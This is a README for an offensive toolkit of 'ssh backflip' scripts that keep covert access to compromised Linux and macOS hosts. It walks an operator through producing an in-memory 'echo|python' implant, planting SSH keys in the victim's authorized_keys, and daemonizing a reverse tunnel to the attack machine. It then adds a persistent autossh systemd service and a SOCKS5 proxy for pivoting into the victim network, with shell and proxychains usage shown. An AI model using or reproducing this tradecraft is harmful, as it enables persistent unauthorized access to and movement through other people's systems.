# WTF

These are backflip scripts used to create ssh backflips. This allows
for a connection outbound from a compromised unix system to an attack
machine that provides a reverse tunnel back into the attack machine's
ssh server. It deploys keys to make this all possible.

Linux backflips are in linux-ssh-backflips.

OS X backflips are in osx-ssh-backflips.

# Things to Take Note of

* Port numbers for both reverse port forwards and socks proxies will
  need to be managed out of band. Implement a process and use it.
* You are running an additional ssh server that your victims ssh
  to. This can be abused by somebody who has control of the victim
  machine. While shell access is disabled, and only reverse forwarding
  will work, one should be aware of this caveat.

# Components

The structure here is a little confusing at first. Because we don't
want to leave a script file on disk, we give cut-n-paste commands that
are of the form `echo xxx|python`. The cut-n-paste command is
generated from the scripts that are indirectly run. This is important
for the operator to understand what these scripts do on target, but
the the scripts the operator directly uses are `make_backflip.py` and
`install_autossh_backflip.py`

## Linux backflips

### `make_backflip.py`

runs on the attack machine that gives the cut-n-paste command to
run on victim

### `implant.py`

embedded in `install_implant.py` that daemonizes and makes ssh
connections. Note that the current implementation uses
`subprocess.Popen` with `shell=True`, which will cause an `execve`
with `sh -c` to appear in logs.

### `install_implant.py`

template of script that will be encoded and outputed as the
cut-n-paste command by `make_backflip.py`

## Socks proxies over backflip

### `install_autossh_backflip.py`

runs on attack machine and installs and starts a socks proxy into victim network

# How to Setup a Backflip

In our examples, our victim is 10.0.0.1 and our proxy01 external IP is
at 10.50.0.1. We setup our reverse port-forwards are on ports 4000
onwards and our socks proxies are on ports 5000 onwards

1. Get a shell on victim host

1. run `make_backflip.py` on the attack host

	The invocation is `make_backflip.py <user> <victim-ip> <attacker-ip> <reverse listen port>`.
	Assuming the victim username is ubuntu, attack and victim ip given
	above, and listen port 4000:

		sudo ./make_backflip.py ubuntu 10.0.0.1 10.50.0.1 4000

	This will make port 4000 on proxy01 with a remote connection to
	10.0.0.1 on 22 when the command that is outputed is run on the
	victim. This will also create a keypair on the attack machine in
	`/opt/backflip/keys` with the format `<username>-<victim>-<attack>`.
	Note that you will need to allocate a new port with each blackflip
	created.

1. run the command that `make_backflip.py` outputs on the victim

   You should see output like:

		[+] keypath: /home/ubuntu/.ssh/id_rsab
		[+] wrote private key: /home/ubuntu/.ssh/id_rsab
		[+] wrote public key: /home/ubuntu/.ssh/id_rsab.pub
		[+] wrote to ~/.ssh/authorized_keys
		[+] started daemonized tunnel
		[*] waiting one minute for tunnel to come up...
		[+] tunnel running

1. run `install_autossh_backflip.py` on the attack host

	`install_autossh_backflip.py` will create a systemd service to initiate the ssh
	connection to the victim and reverse port-forward a connection to
	their ssh daemon on the attack system. Additionally, it will setup a
	SOCKS5 proxy listening on a port you specify. As above, it is
	important to note which SOCKS port you are using and each backflip
	will require a unique one.

	In this example, we setup a persistant ssh connection with reverse
	forward as well as a socks proxy on port 5000:

		sudo ./install_autossh_backflip.py 4000 5000 /opt/backflips/keys/ubuntu-10.0.0.1-10.50.0.1
		contents:
		[Unit]
		Description=ssh backflip to 4000
		After=network.target auditd.service

		[Service]
		ExecStart=/usr/bin/autossh -oServerAliveInterval=30 -oServerAliveCountMax=5 -oUserKnownHostsFile=/dev/null -oStrictHostKeyChecking=no -oBatchMode=yes -n -N -D :5000 -i /opt/backflips/keys/ubuntu-10.0.0.1-10.50.0.1 -p4000 ubuntu@localhost

		[Install]
		WantedBy=multi-user.target

		Created symlink /etc/systemd/system/multi-user.target.wants/backflip-4000-5000.service â†’ /etc/systemd/system/backflip-4000-5000.service.

	You can see that the proxy and ssh backflip are up:

		$ sudo netstat -lntp | grep -E "4000|5000"
		tcp        0      0 0.0.0.0:4000            0.0.0.0:*               LISTEN      20612/sshd: flip
		tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      20693/ssh
		tcp6       0      0 :::4000                 :::*                    LISTEN      20612/sshd: flip
		tcp6       0      0 :::5000                 :::*                    LISTEN      20693/ssh

	Notice that ssh is listening on 0.0.0.0, meaning that these services
	are available throughout the subnet.

# How to Use a Backflip

There are two primary ways to use a backflip: shell access and proxy access.

## Get a Shell

`/opt/backflips/keys` contains the necessary  ssh keypairs to ssh into
the victim machine. However, the permissions on the directory are such
that a normal user cannot use them. Each key to be used must be copied
to your home directory with permissions and ownership as SSH
expects. In our example:
```
sudo cp /opt/backflips/keys/ubuntu-10.0.0.1-10.50.0.1 ~/.ssh/
sudo chown $UID:$(id -g) ~/.ssh/ubuntu-10.0.0.1-10.50.0.1
chmod 600 ~/.ssh/ubuntu-10.0.0.1-10.50.0.1
```

Note, the user will be the same user as used above to setup the
backflip.

The following will reward you with a shell on the victim:
```
ssh -i ~/.ssh/ubuntu-10.0.0.1-10.50.0.1 -p 4000 ubuntu@127.0.0.1
```

## Use a SOCKS5 Proxy

In our example above, there is a SOCKS5 proxy running on
port 5000. The most practical way to use it is with a browser plugin
such as foxyproxy or switchyomega. However, it is also available for
command line tools with the help of a proxy LD_PRELOAD library such as
`proxychains` or `tsocks`.

For example, a `proxychains.conf` in the current working directory
with contents as such:

	strict_chain
	# Quiet mode (no output from library)
	#quiet_mode
	proxy_dns

	# Some timeouts in milliseconds
	tcp_read_time_out 15000
	tcp_connect_time_out 8000

	[ProxyList]
	socks5  127.0.0.1 5000

We can verify that our SOCKS proxy works with curl as we see our
victim IP instead of our attack IP:

```
$ proxychains curl ifconfig.me; echo
ProxyChains-3.1 (http://proxychains.sf.net)
|DNS-request| ifconfig.me
|S-chain|-<>-127.0.0.1:5000-<><>-4.2.2.2:53-<><>-OK
|DNS-response| ifconfig.me is 216.239.32.21
|S-chain|-<>-127.0.0.1:5000-<><>-216.239.32.21:80-<><>-OK
10.0.0.1
```
